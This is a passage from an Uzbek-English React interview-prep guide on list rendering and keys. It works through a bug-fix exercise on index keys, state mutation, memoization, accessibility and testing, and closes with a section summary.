      {value}: {count}
    </button>
  );
}

function BadList({ values }: { values: number[] }) {
  return values
    .filter((v) => v > 0)
    .map((v, i) => <ComponentWithState key={i} value={v} />);
}

// Initial: values = [1, 2, 3]
// filter: [1, 2, 3]
// map keys: [0, 1, 2]
// User clicks Component(value=1) → count=1

// values changes to [-1, 2, 3]
// filter: [2, 3]
// map keys: [0, 1]
// Reconciler: key=0 (was Component(value=1)) → reused with new value=2
// count state stays "1" but value is now 2 — visual mismatch!
```

**Stable ID fix:**

```tsx
function GoodList({ values }: { values: { id: string; v: number }[] }) {
  return values
    .filter((item) => item.v > 0)
    .map((item) => <ComponentWithState key={item.id} value={item.v} />);
}

// Reconciler: keys [a, b, c] → [b, c] after filter
// Component(value=1) (key=a) unmounts properly
// Components b, c retain their state correctly
```

**Filter + add index pattern:**

```tsx
function FilteredWithIndex({ items, predicate }: { items: Item[]; predicate: (item: Item) => boolean }) {
  return items
    .map((item, i) => ({ item, originalIndex: i }))
    .filter(({ item }) => predicate(item))
    .map(({ item, originalIndex }) => (
      <Item key={originalIndex} item={item} />  // ← original index OK if items stable
    ));
}

// Stable original index — but if items reorder, breaks
// Best: use item.id
```

**Performance — useMemo for derived list:**

```tsx
function OptimizedList({ items, query }: { items: Item[]; query: string }) {
  const filtered = useMemo(
    () => items.filter((item) => item.name.includes(query)),
    [items, query]
  );

  return filtered.map((item) => (
    <Item key={item.id} item={item} />
  ));
}
```

**Pagination + filter pattern:**

```tsx
function PaginatedList({
  items,
  query,
  page,
  pageSize
}: {
  items: Item[];
  query: string;
  page: number;
  pageSize: number;
}) {
  const filtered = items.filter((item) => item.name.includes(query));
  const start = page * pageSize;
  const paginated = filtered.slice(start, start + pageSize);

  return paginated.map((item) => (
    <Item key={item.id} item={item} />  // ← ID stable across pages
  ));
}
```

**Group by + map:**

```tsx
function GroupedList({ items }: { items: Item[] }) {
  const grouped = items.reduce<Record<string, Item[]>>((acc, item) => {
    (acc[item.category] ??= []).push(item);
    return acc;
  }, {});

  return Object.entries(grouped).map(([category, items]) => (
    <section key={category}>  {/* ✅ category as key */}
      <h2>{category}</h2>
      <ul>
        {items.map((item) => (
          <li key={item.id}>{item.name}</li>  {/* ✅ ID inner */}
        ))}
      </ul>
    </section>
  ));
}
```

</details>

### Edge Cases

- **Empty filter result**: `.filter().map()` returns empty array — render nothing. No key issue.
- **Filter with side effects**: `.filter((item) => { console.log(item); return cond; })` — side effect in render. Move to useEffect.
- **`indexOf` for original index**: `items.indexOf(filteredItem)` — O(n) per item, O(n²) total. Slow for large lists.

### Follow-up savollar

- "Sort + map — same issues?" — Yes. Sort changes order, index keys break state preservation. Stable ID essential.
- "Reduce + map — key strategy?" — Reduce produces array/object — map stable IDs. Same rules.
- "Performance — chain `.filter().map()` vs single `for` loop?" — Modern engines optimize chains. For huge lists (10k+), single loop slightly faster.

</details>

---

### 59. Bug fix: list rendering anti-patterns to'plami [Bug Fix] [Senior]

<details>
<summary><strong>Javob</strong></summary>

### Savol

Quyidagi komponent bir nechta muammolarga ega. Topish va tuzatish:

```tsx
function ProductCatalog({ products, query }) {
  const [favorites, setFavorites] = useState({});

  return (
    <div>
      {products
        .filter(p => p.name.includes(query))
        .sort((a, b) => a.price - b.price)
        .map((product, i) => (
          <div key={i} onClick={() => {
            favorites[product.id] = !favorites[product.id];
            setFavorites(favorites);
          }}>
            <img src={product.image} />
            {product.name} — ${product.price}
            {favorites[product.id] ? "♥" : "♡"}
            {product.tags.map((tag) => <span>{tag}</span>)}
          </div>
        ))}
    </div>
  );
}
```

### Javob

**Topilgan muammolar:**

1. **❌ Index as key + filter/sort** — reorder bug
2. **❌ State mutation** — `favorites[product.id] = ...` direct mutate
3. **❌ Same reference setState** — `setFavorites(favorites)` no re-render
4. **❌ Missing key on inner map** — tags `<span>` no key
5. **❌ TypeScript yo'q** — type safety zero
6. **❌ `<img>` alt yo'q** — a11y
7. **❌ `<img>` self-closing yo'q** (HTML strict)
8. **❌ Click handler arrow inline** — har render new function (memo bypass)
9. **❌ filter+sort har render** — useMemo yo'q

**Tuzatilgan kod:**

```tsx
interface Product {
  id: string;
  name: string;
  price: number;
  image: string;
  tags: string[];
}

interface ProductCatalogProps {
  products: Product[];
  query: string;
}

function ProductCatalog({ products, query }: ProductCatalogProps) {
  const [favorites, setFavorites] = useState<Set<string>>(new Set());

  // ✅ Memoize derived list
  const sorted = useMemo(() => {
    return products
      .filter((p) => p.name.toLowerCase().includes(query.toLowerCase()))
      .toSorted((a, b) => a.price - b.price);  // ES2023 immutable sort
  }, [products, query]);

  // ✅ Stable callback
  const toggleFavorite = useCallback((id: string) => {
    setFavorites((prev) => {
      const next = new Set(prev);  // ✅ Immutable update
      if (next.has(id)) {
        next.delete(id);
      } else {
        next.add(id);
      }
      return next;
    });
  }, []);

  return (
    <div>
      {sorted.map((product) => (
        <ProductCard
          key={product.id}  // ✅ Stable ID
          product={product}
          isFavorite={favorites.has(product.id)}
          onToggleFavorite={toggleFavorite}
        />
      ))}
    </div>
  );
}

// Extracted child — memoizable
const ProductCard = memo(function ProductCard({
  product,
  isFavorite,
  onToggleFavorite,
}: {
  product: Product;
  isFavorite: boolean;
  onToggleFavorite: (id: string) => void;
}) {
  return (
    <div onClick={() => onToggleFavorite(product.id)} role="button" tabIndex={0}>
      <img
        src={product.image}
        alt={`Image of ${product.name}`}  // ✅ a11y
      />
      {product.name} — ${product.price}
      {isFavorite ? "♥" : "♡"}
      <div>
        {product.tags.map((tag) => (
          <span key={tag}>{tag}</span>  // ✅ Tag as key (assuming unique)
        ))}
      </div>
    </div>
  );
});
```

<details>
<summary><strong>Deep Dive</strong></summary>

**Bug 1: Index after filter+sort:**

```tsx
// products: [A($10), B($20), C($15)]
// query "" → all
// sort by price: [A($10), C($15), B($20)]
// keys: [0, 1, 2]

// Add new product D($5):
// products: [A, B, C, D]
// filter+sort: [D($5), A($10), C($15), B($20)]
// keys: [0, 1, 2, 3]

// Reconciler:
// key=0 was A's fiber (with click state) → now mapped to D
// User's click state on A now appears on D (wrong!)
```

**Bug 2: Object mutation:**

```tsx
favorites[product.id] = !favorites[product.id];  // direct mutation
setFavorites(favorites);                          // same reference
// React: Object.is(prev, new) → true → bailout
// Even though we mutated, React doesn't re-render
```

**Bug 3: Missing key warning:**

```tsx
{product.tags.map((tag) => <span>{tag}</span>)}
// Console: "Each child in a list should have a unique 'key' prop"
// Reconciler falls back to index — suboptimal
```

**Bug 4: Inline handler — new function each render:**

```tsx
<div onClick={() => {
  favorites[product.id] = ...
  setFavorites(...)
}}>

// Each render: new function reference
// If <div> were memoized component → re-renders due to new prop reference
// useCallback fix: stable reference
```

**Bug 5: TypeScript safety:**

```tsx
function ProductCatalog({ products, query }) {
  // ❌ products: any, query: any
  // Bug-prone: products[0].nme (typo) — no TS error
}

interface ProductCatalogProps {
  products: Product[];
  query: string;
}
function ProductCatalog({ products, query }: ProductCatalogProps) {
  // ✅ products[0].nme → TS error
}
```

**Bug 6: a11y — alt text:**

```tsx
<img src={product.image} />
// Screen reader: "graphic" (no description)
// SEO: missing alt

<img src={product.image} alt={`Image of ${product.name}`} />
// Screen reader: "Image of Phone X"
```

**Bug 7: Performance — useMemo:**

```tsx
// Without useMemo:
// Every render → new filtered+sorted array (O(n log n))
// Even when products and query unchanged

const sorted = useMemo(() => {
  return products.filter(...).toSorted(...);
}, [products, query]);
// Cached — only recomputes when deps change
```

**Bug 8: Set vs Object:**

```tsx
// ❌ Object — must Object.keys(), spread for immutable update
const favorites = {};
favorites[id] = true;
setFavorites({ ...favorites, [id]: true });  // verbose

// ✅ Set — clearer intent for "is in collection"
const favorites = new Set<string>();
favorites.add(id);
setFavorites(new Set(favorites));  // immutable
```

**`Array.prototype.toSorted` (ES2023):**

```tsx
// ❌ Old way — mutates
const sorted = [...arr].sort();  // copy first

// ✅ New way — immutable
const sorted = arr.toSorted();  // returns new array
```

Same for `toReversed`, `toSpliced`, `with`.

**Test coverage:**

```typescript
test("toggles favorite on click", () => {
  const products = [{ id: "1", name: "Phone", price: 100, image: "x", tags: [] }];
  render(<ProductCatalog products={products} query="" />);

  const card = screen.getByText(/Phone/);
  expect(screen.getByText("♡")).toBeInTheDocument();  // not favorite

  fireEvent.click(card);
  expect(screen.getByText("♥")).toBeInTheDocument();  // favorite

  fireEvent.click(card);
  expect(screen.getByText("♡")).toBeInTheDocument();  // toggled back
});

test("filters products correctly", () => {
  const products = [
    { id: "1", name: "Phone", price: 100, image: "", tags: [] },
    { id: "2", name: "Laptop", price: 500, image: "", tags: [] },
  ];
  render(<ProductCatalog products={products} query="phone" />);

  expect(screen.getByText(/Phone/)).toBeInTheDocument();
  expect(screen.queryByText(/Laptop/)).not.toBeInTheDocument();
});
```

**Production debugging:**

- React DevTools Profiler — re-render count per component
- "Highlight Updates" — visual re-render flash
- ESLint rules: `react/jsx-key`, `react-hooks/exhaustive-deps`, `jsx-a11y/alt-text`
- TypeScript strict mode — type safety enforcement

</details>

### Edge Cases

- **`Set` in state**: Compare with `===` doesn't work — always different reference. Use functional update + new Set creation.
- **`useMemo` with `Set`**: Set as dep won't trigger memo recomputation if same reference. Convert to array for stable comparison.
- **`memo` + Set prop**: Set reference changes each render — memo bypass. Pass `isFavorite` boolean instead.
- **`crypto.randomUUID` for tag key**: Tag duplicates — use `${tag}-${i}` if duplicates expected.

### Follow-up savollar

- "How to test re-render minimization?" — React Testing Library doesn't expose render count. Use `<Profiler onRender>` callback or DevTools.
- "Should I extract every list item to memo'd component?" — Only if items have substantial render cost. Small leaf items — memo overhead > benefit.
- "Set vs Map vs Object for state?" — Set: presence check. Map: key-value with non-string keys. Object: simple key-value. Choose based on access pattern.

</details>

---

## Xulosa

Bu faylda quyidagilar yoritildi:

**QISM A — React Fundamentals (1-9)**: Declarative model, vanilla vs React, Virtual DOM va Fiber, renderer concept, one-way data flow, React tarixi, Compiler, RSC, component-based architecture.

**QISM B — Rendering Pipeline (10-19)**: `createRoot` API, Strict Mode, Render/Commit phases, Commit Phase 3 sub-phases, useEffect timing, mount vs re-render, batching (R17 vs R18), `flushSync`, output savollar.

**QISM C — JSX va TSX (20-30)**: JSX/TSX farqi, syntax extension, JSX vs HTML, transform (Classic vs Automatic), expressions, single root va Fragment, spread attributes, `dangerouslySetInnerHTML`, 0 trap, conditional patterns, controlled inputs.

**QISM D — List Rendering va Keys (31-36)**: Key prop roli, index as key xatosi, stable/unique/predictable rules, nested lists, output va bug fix.

**Keyingi:** [02-internals.md](02-internals.md) — Fiber Architecture, Reconciliation Algorithm, Scheduler & Lanes, Hydration — kursning yuragi internals chuqur.
